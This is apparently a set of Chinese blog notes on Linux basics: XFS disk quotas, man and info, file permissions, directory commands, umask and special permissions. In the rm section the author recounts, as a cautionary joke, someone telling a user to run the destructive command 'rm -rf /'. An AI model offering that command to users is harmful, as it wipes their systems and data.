超过soft的限定值会开始倒计时，后果就是锁定磁盘使用，当然超过hard的话直接锁定 实际操作（xfs文件系统）目标1.创建3个账号，默认密码password 2.创建一个群组，把所有用户给到这个群组 3.每个用户限制500M的磁盘使用量，警告值450M，群组1G的限制，950的警告 4.尝试给一个目录限制磁盘使用（用户组与目录的限制不能共同开启） 5.宽限时间的限制 实现创建三个账号 12345678910#!bash#groupadd quotagrpfor username in quota1 quota2 quota3do useradd -g quotagrp $username echo &quot;password&quot; | passwd --stdin $usernamedonemkdir /home/quotachgrp quotagrp /home/quotachmod 2770 /home/quota 然后限制所在的家目录/home/XXX，xfs的磁盘配额在挂载时申明，需要修改/etc/fstab，在配额的磁盘options加上usrquota,grpquota 1/dev/mapper/centos-home /home xfs defaults,usrquota,grpquota 0 0 重新挂载 此外options还可以设置 uquota/usrquota/quota：用户账号 gquota/grpquota：群组 pquota/prjquota：单一目录，不能与群组共存 配额命令12345678910111213141516xfs_quota -x -c &quot;command&quot; [mountpoint]-x:专家模式，使用了才能加入-c命令参数-c:后面能加各种命令command: print:列出当前文件系统参数（可以看到是否支持quota） df:列出各磁盘分区数据，后面可接-b(block),-i(inode),-h(单位)等 report:列出所欲配额选项的数据，可以加上-ugp(user/group/project)或-bi state:查看磁盘的配额状态xfs_quota -x -c &quot;limit [-ugp] b[soft|hard]=N i[soft|hard]=N name&quot; dirxfs_quota -x -c &quot;timer [-ugp] [-bir] Ndays|Nhours|Nweeks|Nminutes&quot; dirlimit:设置配额选项 -gpu:group/project/user b[soft|hard]:设置block的限制，i就是inode name:就是用户/用户组 dir:配额的是这个目录，也就是用户在这个目录下的容量被限制timer:设置宽限时间 然后按照我们的目标设置如下 123456789101112131415161718192021222324[root@study ~ 19:53 #10] # xfs_quota -x -c &quot;limit -u bsoft=450M bhard=500M quota1&quot; /home[root@study ~ 19:54 #11] # xfs_quota -x -c &quot;limit -u bsoft=450M bhard=500M quota2&quot; /home[root@study ~ 19:54 #12] # xfs_quota -x -c &quot;limit -u bsoft=450M bhard=500M quota3&quot; /home[root@study ~ 19:54 #13] # xfs_quota -x -c &quot;report -uh&quot; /homeUser quota on /home (/dev/mapper/centos-home) Blocks User ID Used Soft Hard Warn/Grace ---------- --------------------------------- root 466.5M 0 0 00 [0 days]manu 166.5M 0 0 00 [------]y2n 6.2M 0 0 00 [------]quota1 295.2M 450M 500M 00 [------]quota2 12K 450M 500M 00 [------]quota3 12K 450M 500M 00 [------] [root@study ~ 19:55 #14] # xfs_quota -x -c &quot;limit -g bsoft=950M bhard=1G quotagrp&quot; /home[root@study ~ 19:59 #15] # xfs_quota -x -c &quot;report -gh&quot; /homeGroup quota on /home (/dev/mapper/centos-home) Blocks Group ID Used Soft Hard Warn/Grace ---------- --------------------------------- root 466.5M 0 0 00 [------]manu 166.5M 0 0 00 [------]y2n 6.2M 0 0 00 [------]quotagrp 295.2M 950M 1G 00 [------] 如果限制的用户属于限制的用户组，用户组的容量优先 限制目录容量（project） 有一种情况就是在/home下还有一个目录属于某个群组，而这个群组成员使用的容量会影响到这个目录的容量，所以如果要针对目录来限制的话，就必须关闭群组的选项 修改/etc/fstab1234567891011121314151617dev/mapper/centos-home /home xfs defaults,usrquota,prjquota 0 0 [root@study ~ 12:53 #2] # xfs_quota -x -c &quot;state&quot;User quota state on /home (/dev/mapper/centos-home) Accounting: ON Enforcement: ON Inode: #133932 (2 blocks, 2 extents)Group quota state on /home (/dev/mapper/centos-home) Accounting: OFF Enforcement: OFF Inode: #133933 (2 blocks, 2 extents)Project quota state on /home (/dev/mapper/centos-home) Accounting: ON Enforcement: ON Inode: #133933 (2 blocks, 2 extents)Blocks grace time: [7 days]Inodes grace time: [7 days]Realtime Blocks grace time: [7 days] 规范目录、选项名称及id1234567Enabling project quota on an XFS filesystem (restrict files in log file directories to only using 1 gigabyte of space). # mount -o prjquota /dev/xvm/var /var # echo 42:/var/log &gt;&gt; /etc/projects # echo logfiles:42 &gt;&gt; /etc/projid # xfs_quota -x -c 'project -s logfiles' /var # xfs_quota -x -c 'limit -p bhard=1g logfiles' /var 以上是官方例子，写两个配置文件，id:目录写到/etc/projects，自定义选项名:id写到/etc/projid，使用xfs_quota -x -c 'project -s 自定义名字' /dir初始化即可进行limit等设置，这里我就不过多演示了 磁盘配额的管理命令12345以下指令接在-c后面disable:暂停限制，后面接-gpuenable:恢复，与disable相对off:完全关闭，只有重新挂载才能恢复remove:删除限制，后面接-gpu 不修改文件系统的配额配额针对文件系统，而假如突然在其他的目录想使用配额，需要把它重新规划成一个单独的分区吗？可以巧妙的用链接搞定 比如我想把/var/spool/mail目录限制容量 将它移动到/home ln -s /home/mail /var/spool/mail建立目标链接 然后我们就可以只针对/home限制即可","link":"/Linux/12.%E7%A3%81%E7%9B%98%E9%85%8D%E9%A2%9D.html"},{"title":"（十三）磁盘阵列","text":"磁盘阵列全名Redundant Arrays of independent Disks，通过技术将小磁盘组成大磁盘设备，有存储和数据保护的功能，磁盘阵列有几个级别（level），分别是RAID0,RAID1,RAID5,RAID6… RAID0","link":"/Linux/13.%E7%A3%81%E7%9B%98%E9%98%B5%E5%88%97.html"},{"title":"（十四）LVM","text":"","link":"/Linux/14.LVM.html"},{"title":"（二）Linux尝鲜","text":"是时候动手了 安装问题使用VMware 15 Pro安装Linux时黑屏 在windows命令行输入netsh winsock reset解决 照书上所有流程后有了图型界面 为什么Linux有登陆、注销、关机这么多选项？ Linux是一个多人多任务环境，随时有不同的用户的任务在执行，不正常的关机会导致数据损毁 所以通常Linux主机都会挂一个UPS（不间断电源） 注销不是关机，只是让你的账户离开系统 X Windows与命令行模式切换 X Windows是窗口管理系统 命令行界面也叫终端、Terminal、Console Linux默认有6个终端，使用Alt+Ctrl+(F1-F6)切换tty1-6 因为虚拟机默认装了图形界面，所有tty1默认是图形界面 在终端中，输入startx也能进入图形界面，不过有几个条件 并没有其他的X Window被占用 必须安装X Window，且X Sever能够启动 有窗口管理器，比如GNOME、KDE 图形环境就是命令行界面加上X Window软件的结合 ~代表用户的家目录，是一个变量，$代表普通用户，#代表root用户，root就是Linux的神 指令1$ command [-options] parameter1 parameter2 第一个输入的一定是command或者可执行文件（如shell脚本） []代表可选，-表示选项，如-h，--表示选项全称，如--help 命令、选项、参数之间使用空格分开，不管空多少格都被认为一格 按下回车开始执行命令 命令太长使用\\转行，也是转义字符 命令区分大小写 多个指令可以使用;分隔 date12[manu@study ~]$ date2019年 12月 29日 星期日 03:20:42 CST 格式化输出 12[manu@study ~]$ date +%Y/%m/%d2019/12/29 cal(calendar) 基本语法： 1$ cal [month] [year] 12345678[manu@study ~]$ cal December 2019 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 11 12 13 1415 16 17 18 19 20 2122 23 24 25 26 27 2829 30 31 1234567891011121314151617181920212223242526272829303132333435[manu@study ~]$ cal 2019 2019 January February March Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 1 2 1 2 6 7 8 9 10 11 12 3 4 5 6 7 8 9 3 4 5 6 7 8 913 14 15 16 17 18 19 10 11 12 13 14 15 16 10 11 12 13 14 15 1620 21 22 23 24 25 26 17 18 19 20 21 22 23 17 18 19 20 21 22 2327 28 29 30 31 24 25 26 27 28 24 25 26 27 28 29 30 31 April May June Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 1 2 3 4 1 7 8 9 10 11 12 13 5 6 7 8 9 10 11 2 3 4 5 6 7 814 15 16 17 18 19 20 12 13 14 15 16 17 18 9 10 11 12 13 14 1521 22 23 24 25 26 27 19 20 21 22 23 24 25 16 17 18 19 20 21 2228 29 30 26 27 28 29 30 31 23 24 25 26 27 28 29 30 July August September Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 1 2 3 1 2 3 4 5 6 7 7 8 9 10 11 12 13 4 5 6 7 8 9 10 8 9 10 11 12 13 1414 15 16 17 18 19 20 11 12 13 14 15 16 17 15 16 17 18 19 20 2121 22 23 24 25 26 27 18 19 20 21 22 23 24 22 23 24 25 26 27 2828 29 30 31 25 26 27 28 29 30 31 29 30 October November December Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 1 2 1 2 3 4 5 6 7 6 7 8 9 10 11 12 3 4 5 6 7 8 9 8 9 10 11 12 13 1413 14 15 16 17 18 19 10 11 12 13 14 15 16 15 16 17 18 19 20 2120 21 22 23 24 25 26 17 18 19 20 21 22 23 22 23 24 25 26 27 2827 28 29 30 31 24 25 26 27 28 29 30 29 30 31 bc进入简单的计算器，scale显示小数点后的位数，quit退出 1234567891011121314151617[manu@study ~]$ bcbc 1.06.95Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006 Free Software Foundation, Inc.This is free software with ABSOLUTELY NO WARRANTY.For details type `warranty'. 8^8167772168*8647/237%31scale=31/3.333quit 总结命令有两种情况 输入指令–&gt;输出–&gt;等待输入下一个指令（命令提示符环境） 输入指令（进入软件环境）–&gt;输出–&gt;结束该指令（退出软件环境）–&gt;命令提示符环境 热键TAB 在第一个字段连按两次，可以补全指令 在后面的字段连按两次，可文件补全 若安装了Bash-completion，可以补全参数/选项 Ctrl+C 可以停止错误的、不停运行的指令 Ctrl+D 代表键盘输入结束(End Of file,EOF或End Of Input) 也相当于输入了exit Shift+PU/PD 向上、向下翻页 在线求助--help123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899[manu@study ~]$ date --help 用法：date [选项]... [+格式] 或：date [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]Display the current time in the given FORMAT, or set the system date.Mandatory arguments to long options are mandatory for short options too. -d, --date=STRING display time described by STRING, not 'now' -f, --file=DATEFILE like --date once for each line of DATEFILE -I[TIMESPEC], --iso-8601[=TIMESPEC] output date/time in ISO 8601 format. TIMESPEC='date' for date only (the default), 'hours', 'minutes', 'seconds', or 'ns' for date and time to the indicated precision. -r, --reference=文件 显示文件指定文件的最后修改时间 -R, --rfc-2822 以RFC 2822格式输出日期和时间 例如：2006年8月7日，星期一 12:34:56 -0600 --rfc-3339=TIMESPEC output date and time in RFC 3339 format. TIMESPEC='date', 'seconds', or 'ns' for date and time to the indicated precision. Date and time components are separated by a single space: 2006-08-07 12:34:56-06:00 -s, --set=STRING set time described by STRING -u, --utc, --universal print or set Coordinated Universal Time (UTC) --help 显示此帮助信息并退出 --version 显示版本信息并退出给定的格式FORMAT 控制着输出，解释序列如下： %% 一个文字的 % %a 当前locale 的星期名缩写(例如： 日，代表星期日) %A 当前locale 的星期名全称 (如：星期日) %b 当前locale 的月名缩写 (如：一，代表一月) %B 当前locale 的月名全称 (如：一月) %c 当前locale 的日期和时间 (如：2005年3月3日 星期四 23:05:25) %C 世纪；比如 %Y，通常为省略当前年份的后两位数字(例如：20) %d 按月计的日期(例如：01) %D 按月计的日期；等于%m/%d/%y %e 按月计的日期，添加空格，等于%_d %F 完整日期格式，等价于 %Y-%m-%d %g ISO-8601 格式年份的最后两位 (参见%G) %G ISO-8601 格式年份 (参见%V)，一般只和 %V 结合使用 %h 等于%b %H 小时(00-23) %I 小时(00-12) %j 按年计的日期(001-366) %k hour, space padded ( 0..23); same as %_H %l hour, space padded ( 1..12); same as %_I %m month (01..12) %M minute (00..59) %n 换行 %N 纳秒(000000000-999999999) %p 当前locale 下的&quot;上午&quot;或者&quot;下午&quot;，未知时输出为空 %P 与%p 类似，但是输出小写字母 %r 当前locale 下的 12 小时时钟时间 (如：11:11:04 下午) %R 24 小时时间的时和分，等价于 %H:%M %s 自UTC 时间 1970-01-01 00:00:00 以来所经过的秒数 %S 秒(00-60) %t 输出制表符 Tab %T 时间，等于%H:%M:%S %u 星期，1 代表星期一 %U 一年中的第几周，以周日为每星期第一天(00-53) %V ISO-8601 格式规范下的一年中第几周，以周一为每星期第一天(01-53) %w 一星期中的第几日(0-6)，0 代表周一 %W 一年中的第几周，以周一为每星期第一天(00-53) %x 当前locale 下的日期描述 (如：12/31/99) %X 当前locale 下的时间描述 (如：23:13:48) %y 年份最后两位数位 (00-99) %Y 年份 %z +hhmm 数字时区(例如，-0400) %:z +hh:mm 数字时区(例如，-04:00) %::z +hh:mm:ss 数字时区(例如，-04:00:00) %:::z 数字时区带有必要的精度 (例如，-04，+05:30) %Z 按字母表排序的时区缩写 (例如，EDT)默认情况下，日期的数字区域以0 填充。The following optional flags may follow '%': - (hyphen) do not pad the field _ (underscore) pad with spaces 0 (zero) pad with zeros ^ use upper case if possible # use opposite case if possible在任何标记之后还允许一个可选的域宽度指定，它是一个十进制数字。作为一个可选的修饰声明，它可以是E，在可能的情况下使用本地环境关联的表示方式；或者是O，在可能的情况下使用本地环境关联的数字符号。Examples:Convert seconds since the epoch (1970-01-01 UTC) to a date $ date --date='@2147483647'Show the time on the west coast of the US (use tzselect(1) to find TZ) $ TZ='America/Los_Angeles' dateShow the local time for 9AM next Friday on the west coast of the US $ date --date='TZ=&quot;America/Los_Angeles&quot; 09:00 next Fri'GNU coreutils online help: &lt;http://www.gnu.org/software/coreutils/&gt;请向&lt;http://translationproject.org/team/zh_CN.html&gt; 报告date 的翻译错误要获取完整文档，请运行：info coreutils 'date invocation' man ()里面数字的含义 代号 代表内容 1 用户在shell环境中可以操作的命令或可执行文件 2 系统内核可调用的函数与工具等 3 一些常用的函数和函数库 4 设备文件说明，通常在/dev下 5 配置文件或是某些文件的格式 6 游戏 7 惯例与协议，网络协议、ASCII代码等 8 系统管理员可用的管理命令 9 跟内核有关的文件 man page里面一些常用的操作 按键 进行工作 空格键 向下翻页 PU 向上 PD 向下 Home 第一页 End 最后一页 /string 向下寻找string ?string 向上寻找string n，N n寻找下一个，N返向寻找 q 退出 man page的数据一般在/usr/share/man里，可以通过修改/etc/man_db.conf来修改查找路径 使用man -f man可以查到与man相关所有的相关文件（要完整名称） 12345[manu@study ~]$ man -f manman (1) - 格式化并显示在线帮助手册页man (7) - 格式化手册页的宏man (1p) - display system documentation[manu@study ~]$ 输出结果的左边是命令和数字（代表这个命令的意义），右边是简要说明 然后可以使用man 1 man或man 7 man来查看这些说明文档 man man默认是man 1 man 使用man -k man会找到有man这个关键字的所有说明文件 在root的Terminal下输入mandb后 whatis == man -f apropos == man -k infoinfo page将文件数据拆拆成一个一个段落，每个段落用自己的页面来编写，各个页面中还有类似超链接的跳转，每个独立的界面叫做节点(node) File：代表这个info page来自info.info文件 Node：代表这个页面来自Top节点，Top只是info.info的一个内容节点 Next：表示下一个节点名，按N跳入 Up：表示上一层节点，按U回退一层 Prev：表示上一个节点，按P回退一节 按键 工作 Tab 在节点之间移动，每个节点前有*提示 Enter 进入某节点 b 首页 e 尾页 n 下一节点 p 上一节点 u 上一层 s(/) 搜索 h/? 显示帮助选项 q 退出 /usr(Unix System Resource)/share/doc/一些软件说明在里面 总结 忘记命令的选项和参数，使用--help 不知道的命令，使用man或info 利用软件的功能，使用doc 因为对中文支持不完整，还是多学英语吧。我们遇到英语不要怕，而是要勇敢的面对英语，加油^ _ ^奥里给！！ 文本编辑器nano^代表Ctrl，M代表Alt 多余的不写了 正确的关机方法 sync 数据同步写入磁盘，为了效率，一些数据会在内存反复被CPU使用，使用指令后将数据写入硬盘 shutdown 可以选择关机模式 设置关机时间 可以设置关机信息 可以设置禁告信息 halt 系统停止，可能会保留系统已停止的信息 reboot 重启 poweroff 系统关机 以上指令都会调用systemctl，这个指令很复杂 参考《鸟哥的Linux私房菜 基础学习篇》","link":"/Linux/2.%E4%BD%BF%E7%94%A8Linux.html"},{"title":"（三）Linux文件权限属性","text":"深入理解linux内部 用户与用户组 在Linux里面，任何一个文件都具有用户（user）、所属群组（group）、其他人（others）三种身份的个别权限 所有用户都在/etc/passwd里面，个人密码在/etc/shadow里，群组则在/etc/group里面 文件属性 使用su -切换成root 输入ls -al ls代表list -al可以列出所有文件及属性，包括隐藏文件(.) 1-rw-r--r--. 1 root root 6 12月 29 23:03 1.text 1.第一栏有10个字符，那个.应该没意义 第一个字符 -表示文件 d表示目录， l表示链接文件（link file） b代表设备文件里可存储的周边设备 c代表设备文件里的串行端口设备，如鼠标、键盘等 2-4三个字符是文件拥有者的权限 r代表可读(read) w代表可写(write) x代表可执行(excute) 5-7是用户组的权限，8-10是其他人的权限 没权限则用-表示，rwx顺序不变 2.第二栏表示有多少文件名链接到此节点（inode） 每个文件会将它的权限和属性记录到inode中，由于使用目录树，每个文件都会连接到一个inode，这个属性就是代表有多少不同的文件名连接到同一个inode 3.第三栏表示拥有者账号 4.第四栏表示所属用户组 5.表示大小，默认单位Byte 6.为创建日期或最近修改日期 可使用ls -al --full-time获得所有时间格式 7.第七个为文件名，带.的为隐藏文件 权限的重要性 系统保护的功能 团队开发软件或数据共享的功能 未将权限设置妥当会被有心人士用来搞破坏 所以修改文件时要注意哪些不能动 修改文件属性和权限 chgrp(change group,修改所属用户组) chown(change owner,可以修改用户和用户组) chmod(修改文件权限) 1.修改数字权限 权限一般是rwxrwxrwx九个字符，它们3个3个一组，使用数字代表每个权限 对照表 123r:4W:2x:1 每个身份的权限是相加的 123owner：rw- ==&gt; 4+2=6group：rw- ==&gt; 4+2=6others：rw- ==&gt; 4+2=6 这个文件的权限就用666来表示 2.符号类型修改权限 格式 指令 身份 操作 权限 文件/目录 chmod u(user) + r g(group) _ w o(others) = x a(all) 123[root@study ~]# chmod u=rwx,g-x,o-wx 1.text [root@study ~]# ls -al-rwxrw-r--. 1 root root 6 12月 29 23:03 1.text 目录、文件权限的意义 目录 r：可以查到这个目录里的文件名 w 建立新文件和目录 删除文件（不管权限） 改已存在的文件和目录的名字 移动里面的文件 x：是否可以进入该目录 文件 r：读取文件内容 w：编辑内容 x：可以被系统所执行 与Windows不同，Windows的可执行文件时看后缀来的，比如exe、bat等，Linux就看这个权限有没有 需要注意的是只要你有这个目录的权限，不管这个目录下的文件是不是你的，你都能删除这些文件 文件种类和扩展名1.常规文件(第一个属性是-) 纯文本文件(ASCII)：可使用cat来查看文件内容 二进制文件(binary)：比如可执行文件就是二进制文件 数据文件(data)：有特殊格式，可以使用last读取 2.目录 第一个属性是d 3.链接文件(link) 第一个属性为l，类似windows的快捷方式 4.设备及设备文件(devices) 区块设备文件：第一个属性为b，提供随机存取的接口设备，如硬盘等 字符(character)设备文件：第一个属性是c，串行接口设备，例如键盘、鼠标，一次性读取，不能截断输出 5.数据接口文件(sockets) 通常在网上用来做数据交换用 第一个属性为s 6.数据输送文件(FIFO,pipe) FIFO是为了解决多个程序读取文件发生错误的一种特殊文件格式 第一个属性是p 7.Linux扩展名 如上，只要有x就能执行，不用管什么扩展名 拥有可执行权限也要看是否有可执行代码，不然也没用 当然，还是要了解一些扩展名代表哪些种类 *.sh：脚本或批处理文件，使用shell写的 Z、\\.tar、*.tar.gz、*.zip、*.tgz：打包的压缩文件 .html、\\.php：网页相关文件，.html可使用网页浏览器运行，.php要用客户端浏览器才行 文件名长度限制 单一文件名或目录名限制255字节长度 emm因为想一看这文件名就知道这文件是干嘛的，所以Linux的文件名非常长 文件名的限制 避免和一些指令重合，要避免+，-，开头的. 有一些字符在命令行中有特殊意义，也要避免这样命名","link":"/Linux/3.%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E5%B1%9E%E6%80%A7.html"},{"title":"（四）Linux文件和目录","text":"深入理解2 路径 相对路径 顾名思义，相对与本层路径的路径，使用../回到上一层目录 绝对路径 路径从根目录写起 操作目录12345. 代表此层目录.. 上一层目录- 前一个工作目录~ 使用者身份的家目录~account account的家目录 每个目录下都有.、..这两个目录 根目录的..就是它自己 处理目录的指令 cd(change directory) pwd(Print working directory) 使用pwd -p可显示链接文件的完整目录 mkdir(make directory) -m创建目录时设定权限，默认权限与umask有关 如mkdir -m 711 test -p递归创建目录 如mkdir -p 1/2/3/4 rmdir(remove directory) 仅删除空目录(empty directory) -r不管有没有文件和目录都删除，有点危险 -p递归删除，也要空目录才行 路径变量$PATH使用的指令是可执行文件，例如ls在/bin/ls，为什么在任何地方都可以执行这个指令呢？这就是环境变量PATH的原因 查看一下PATH 12[root@study /]# echo $PATH/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin 由一堆目录组成，每个目录用：隔开 添加目录：PATH=&quot;${PATH}:目录&quot; 不同身份的PATH不同，指令也不同，例如root和普通用户 .目录建议别加入PATH，防止被有心人执行恶意指令 文件和目录管理ls 显示目录和文件，默认显示操作目录 常用l(显示权限)、a(显示隐藏文件)、d ll表示ls -l 123456789101112131415161718192021222324252627282930313233-C 多列输出，纵向排序。 -F 每个目录名加“ / ”后缀，每个 FIFO 名加“ | ”后缀， 每个可运行名加“ * ”后缀。 -R 递归列出遇到的子目录。 -a 列出所有文件，包括以 &quot;.&quot; 开头的隐含文件。 -c 使用“状态改变时间”代替“文件修改时间”为依据来排序 （使用“ -t ”选项时）或列出（使用“ -l ”选项时）。 -d 将目录名象其它文件一样列出，而不是列出它们的内容。 -i 输出文件前先输出文件系列号（即 i 节点号: i-node num‐ ber）。 -l 列出（以单列格式）文件模式（ file mode ），文件的链 接数，所有者名，组名，文件大小（以字节为单位），时间信 息，及文件名。缺省时，时间信息显示最近修改时间；可以以 选项“ -c ”和“ -u ”选择显示其它两种时间信息。对于设 备文件，原先显示文件大小的区域通常显示的是主要和次要的 号（majorand minor device numbers）。 -q 将文件名中的非打印字符输出为问号。（对于到终端的输出这是缺省的。） -r 逆序排列。 -t 按时间信息排序。 -u 使用最近访问时间代替最近修改时间为依据来排序（使用 “ -t ”选项时）或列出（使用“ -l ”选项时）。 -1 单列输出。 cp cp [选项] 源文件 目标文件/目录 cp [选项] 目录 目标路径 复制时注意文件属性，比如备份注意-a，-p，复制给其他用户时要注意文件权限 用户若没有权限更改某些属性，使用-a也没用 使用-l创建硬链接(hard link)，-s创建符号链接(symbolic link)，符号连接有-&gt;符号 当文件更新才复制使用-u 如果源文件两个以上，则最后一个一定要是目录 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 -a, --archive 复制时,尽可能保持文件的结构和属性.(但不保持目录 结构)等同于 -dpR。 -d, --no-dereference 复制符号链接作为符号链接而不是复制它指向的文件, 并且保护在副本中原文件之间的硬链接. -f, --force 删除存在的目标文件。 （较：原译文缺下面的部分） -i, --interactive 无论是否覆盖现存文件都作提示。 -l, --link 制作硬链接代替非目录拷贝。 -p, --preserve 保持原始文件的所有者，组，许可，和时间表属性。 -P, --parents 一个斜杠和指定的源文件名构成目的文件。 最后送给 cp 的参数必须是一个已存在的目录的名字。例如, 下面这个命令: cp --parents a/b/c existing_dir 复制文件 `a/b/c' 到 texisting_dir(现有的目录)/a/b/c',建立任 何缺少的中间目录。 -r 递归地复制目录,复制任何非目录和非符号链接(那是,FIFOs和特别文件)好象他们是常规的文件一样看待.这 意味着尝试读出每个源文件的数据,和把它写到目的地 上.因而,用这个选项,cp'可能彻底地终止,当不确定地读一个FIFO或者/dev/tty时,(这是一个缺陷.它意味着如果你不知道在这棵树(目录)中有什么要复制的时候, 你不得不避开-r并使用-R打开一个未知的设备文件, 比如说一台扫描仪,会有未知的效果发生在硬件上) -R, --recursive 递归地复制目录,保留非目录(参见上面的 -r ).--sparse=WHEN 一个稀疏file'包容`holes'-占用0字节,它不占用任何物理块;系统把他们作为0调用read'来读.由于许多二进制文件包容许多连续的0字节,这样能保存相当的磁盘空 间并且加快速度.省缺情况下, cp 通过自然的启发方式发现在源文件里holes并且使相关的输出文件稀疏. WHEN 值能够是下面中的一个： auto 默认的行为:如果输入文件是稀疏的,输出文件也是稀疏的. always 总是使输出文件稀疏.当输入文件所在的文件系统不支 持稀疏文件的时候，这是有用的,但是输出文件所在的 文件系统需要(支持稀疏文件). never 从不使输出文件稀疏.如果你找到一个需要此选项的应 用程序,让我们知道. -s, --symbolic-link 生成符号链接代替非目录拷贝.所有的源文件名必须是 绝对的(由`/'开始),除非目的文件是在当前目录.这选 项仅仅在系统不支持符号链接时引起一个错误消息. -u, --update 如果存在的目的地有相同的,或者更新的修改时间,不复制非目录(文件). -v, --verbose 在复制前印出文件名. -x, --one-file-system 跳过来自不同文件系统的子目录. rm -f(force)，忽略不存在的文件，不警告 -i，删除有提示，防止删错 -r，递归删除，删除这个目录下的所有东西，不提示 我逛酷安时看到一老哥手机变砖求助，一小伙子正经的说在终端输入rm -rf /，最牛逼的是这老哥还真试了，然后emmm（笑哭） 要注意若文件名与指令重合，使用./ mv 用于移动文件或者重命名 -f，存在不会提示 -i，存在提示是否覆盖 -u，文件较新才会更新 可以移动多个文件mv t1 t2 t3 目录 改名字 1mv test1 test2 使用rename可以批量修改文件名 获取文件名和目录名 basename dirname 显示文件内容cat(concatenate) 将文件的内容连续打印在屏幕上 -A可以显示一些特殊字符，比如TAB是^I，换行是$ -n可以打印行号 tac 是cat的反序，意思就是从最后一行打印到第一行 nl 添加行号打印 -b a不管是否有空行，都打印行号，-b t不打印空行(默认值) -n ln行号在最左边显示，-n rn在右边显示行号，不补齐0，-n nz补齐0（默认6位） -w可以设置补齐位数 1234[root@study ~]# nl -b a -n rz -w 4 /etc/issue0001 \\S0002 Kernel \\r on an \\m0003 more123[root@study ~]# more /etc/man_db.conf 内容略--More--(36%) 可以一页一页的翻动，而不是像cat那样全部显示出来 space：向下翻页 enter：向下翻一行 /string：搜索字符串，n向下搜索 :f：显示文件名和当前行数 q：离开more b或ctrl+b：往回翻页，对文件有效，对管道无效 less 比more功能更多 space、PD：向下翻页 PU：向上翻页 /string ?string n N g：回到开头 G：结尾 q：离开 数据截取head 显示前几行，默认10行 -n num可以显示num行 num是负数表示的意思是后面num行不显示 tail 显示后面几行 -n num -n +num表示文件会从num行后加载出来 -f表示刷新显示这个文件，ctrl+c停止 如何显示中间的5-6行？ 1head -n 6 file | tail -n 2 |是一个管道指令，表示前面的信息交由后面的指令执行 如何显示5-6行的行号？ 1cat -n file | head -n 6 | tail -n 2 非纯文本文件od od [-t TYPE] TYPE a：named character, ignoring high-order bit，默认字符输出 c：ASCII输出 d[size]：利用十进制(decimal)输出数据，每个数据占size字节 f[size]：利用浮点数值(floating)输出数据，每个数据占size字节 o[size]：利用八进制(octal)输出数据，每个数据占size字节 x[size]：利用十六进制(hexadecimal)输出数据，每个数据占size字节 size可以用整数或者大写字母C(sizeof(char)),S(sizeof(shot)),I(sizeof(int)),L(sizeof(long)) 官方文献 If TYPE is f, SIZE may also be F for sizeof(float), D for sizeof(double) or L for sizeof(long double). 实践在数据若没有到高四位时，使用0011填充， 按1字节从低位向高位填充 123456789例如[root@study ~]# echo 0123 |od -t dCc0000000 48 49 50 51 10 0 1 2 3 \\n0000005[root@study ~]# echo 0123 | od -t dSc0000000 12592 13106 10 0 1 2 3 \\n0000005 修改文件时间或创建新文件三个时间参数 modification time，mtime 修改时间 当文件的内容改动时就会更新这个时间 status time，ctime 状态时间 文件的状态，也就是文件的属性、权限 access time，atime 读取时间 文件被读取，这个时间就会被更新 12345[root@study ~]# date;ll /etc/man_db.conf ;ll --time=atime /etc/man_db.conf ;ll --time=ctime /etc/man_db.conf 2020年 01月 02日 星期四 17:45:20 CST-rw-r--r--. 1 root root 5171 10月 31 2018 /etc/man_db.conf-rw-r--r--. 1 root root 5171 1月 2 03:44 /etc/man_db.conf-rw-r--r--. 1 root root 5171 12月 28 07:32 /etc/man_db.conf touch touch [-acdmt] 文件 -a：自定义access time -c：若没有这个文件则不建立新文件 -d：后面接自定义的时间，同–date=”日期或时间” -m：修改modification time -t：使用自定义时间，格式[YYYYMMDDhhmm] 一般用法： 创建空文件 修改问文件时间atime和mtime 默认权限umaskumask用来指定用户在创建文件的权限的默认值 两种方式查看umask 1234[root@study ~]# umask0022[root@study ~]# umask -Su=rwx,g=rx,o=rx 文件属性默认666 1-rw-rw-rw- 目录属性777 1drwxrwxrwx umask代表拿掉权限，只看后面3个数字 123456建立文件:(-rw-rw-rw-)-(-----w--w-)==&gt;-rw--r--r--建立目录:(drwxrwxrwx)-(d----w--w-)==&gt;drwxr-xr-x注意：777-022=755,666-022=644虽然是没错但是有特殊情况比如：(-rw-rw-rw-)-(--------wx)==&gt;-rw---r--r--666-003=663，原本没有x，怎么变成了-wx 设置umask umask 002 文件隐藏属性隐藏属性对于系统安全（Security）是很有帮助的 chattr配置隐藏属性 chattr [+-=][ASacdistu] file/dir 只能在ext2、ext3、ext4的Linux传统文件系统上完整生效 xfs只支持AadiS参数 +添加属性 - =直接配置属性 Aatime不能被修改 S一般是非同步写入磁盘，加上后，任何修改都会同步写入磁盘 a只能添加数据，不能删除和修改，root才能设置 c将文件压缩，读取会自动解压缩 d当dump程序执行时，可以不被dump备份 i可以让一个文件不能被删、改名、添加数据，root s使文件可以被完全删除，无法恢复 u删除可以恢复 lsattr显示文件隐藏属性 lsattr [-adR] -a将隐藏文件的属性也显示出来 -d如果是目录，仅列出目录本身属性而非目录的文件名 -R连同子目录的数据也一并列出来 文件的特殊权限Set UID12[root@study tmp]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 8月 9 09:39 /usr/bin/passwd SUID仅对二进制程序(binary program)有效 执行者需要对该程序有x权限 本权限在执行过程中有效 执行者将具有该程序的拥有者权限（owner） 需要注意的是SUID不能用在shell脚本和目录上 Set GID12[root@study tmp]# ll /usr/bin/locate-rwx--s--x. 1 root slocate 40520 4月 11 2018 /usr/bin/locate 与SUID不同，SGID针对文件和目录 对于文件 SGID对二进制程序有用 执行需要x权限 执行者在执行过程中会获得程序用户组的支持 对于目录 用户对该目录有r、x权限才能进入该目录 